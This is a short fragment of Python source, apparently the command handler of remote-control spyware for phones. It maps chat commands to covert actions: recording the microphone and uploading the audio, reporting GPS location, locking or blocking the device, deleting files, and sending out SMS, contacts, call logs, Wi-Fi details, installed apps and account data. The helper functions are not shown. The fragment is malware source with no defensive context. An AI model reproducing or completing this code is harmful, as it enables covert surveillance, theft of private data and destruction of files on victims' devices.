    elif txt=="/mic_start":start_mic();send("recording")
    elif txt=="/mic_stop":a=stop_mic();send_file(a,"audio.mp3") if a else send("no")
    elif txt=="/gps":send(f"GPS: {get_gps()}")
    elif txt=="/lock":lock_screen();send("locked")
    elif txt=="/block":block_all();send("blocked")
    elif txt=="/delete":delete_files();send("deleted")
    elif txt=="/vibrate":vibrate();send("vibrate")
    elif txt=="/flash":flash_led();send("flash")
    elif txt=="/wall":set_wallpaper();send("wallpaper")
    elif txt=="/notify":send_notification();send("notify")
    elif txt=="/apps":send(f"APPS: {get_apps()}")
    elif txt=="/sms":send(f"SMS: {get_sms()}")
    elif txt=="/contacts":send(f"CONTACTS: {get_contacts()}")
    elif txt=="/calls":send(f"CALLS: {get_calls()}")
    elif txt=="/wifi":send(f"WIFI: {get_wifi()}")
    elif txt=="/accounts":send(f"ACCOUNTS: {get_accounts()}")
